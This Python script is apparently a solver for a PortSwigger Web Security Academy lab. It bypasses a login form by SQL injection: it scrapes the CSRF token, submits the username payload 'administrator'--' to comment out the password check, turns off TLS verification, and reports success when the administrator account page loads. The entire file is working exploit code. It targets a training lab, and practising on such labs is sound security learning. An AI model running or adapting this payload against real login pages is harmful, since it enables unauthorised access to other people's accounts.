import requests
import urllib3
import sys
import argparse
from bs4 import BeautifulSoup
from banner import banner

# Disable SSL/TLS warnings to keep the terminal clean when using
# interception proxies like Burp Suite.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Optional Proxy Configuration:
# Uncomment PROXIES and add 'proxies=PROXIES' to requests.get to intercept
# traffic for further manual analysis.
# PROXIES = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def check_url(url):
    if url[-1] == '/':
        url = url[:-1]
    return url

def get_csrf(url, s):
    r = s.get(url=url, verify=False)  # To use Burp Suite or a similar proxy, include the 'proxies=proxies' parameter.

    soup = BeautifulSoup(r.text, 'html.parser')  # Convert raw HTML response into a searchable BeautifulSoup object

    token_csrf = soup.find('input', {'name':'csrf'})['value']

    if token_csrf:
        print(f'[+] Successfully retrieved the "csrf" token.')
        return token_csrf
    else:
        print(f'[-] Failed to retrieve the token.')
        sys.exit(1)

def exploit(url, csrf, s):
    r = s.post(url=url, data={'csrf':csrf, 'username':'administrator\'--', 'password':"test"}, verify=False) # To use Burp Suite or a similar proxy, include the , proxies=proxies parameter.

    soup = BeautifulSoup(r.text, 'html.parser')

    container = soup.find('div', id='account-content')

    if container:
        paragraph = container.find('p')

        if paragraph:
            message = paragraph.get_text(strip=True)
            print('[INFO] Message found:', message)
            
            if 'administrator' in message:
                print('[+] SUCCESS! The exploit was successful, and the lab has been solved.')
            else:
                print('[-] Error: The exploit failed to retrieve the data.')
        else:
            print('[-] No paragraph found inside the container.')
            sys.exit(2)
    else:
        print('[-] Container with \'id=account-content\' not found')
        sys.exit(3)


def main(url):

    try:
        banner()
    except Exception:
        pass

    url = check_url(url)

    complete_url = url + '/login'

    s = requests.Session()

    csrf_token = get_csrf(complete_url, s)

    if csrf_token:
        print('[INFO] Executing exploit...')
        exploit(complete_url, csrf_token, s)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Python exploit for PortSwigger\'s SQLi lab: Bypassing login form.')

    parser.add_argument('-t', '--target', required=True,
                        help='Target Domain | Example: https://example.com')
    
    args = parser.parse_args()

    main(args.target)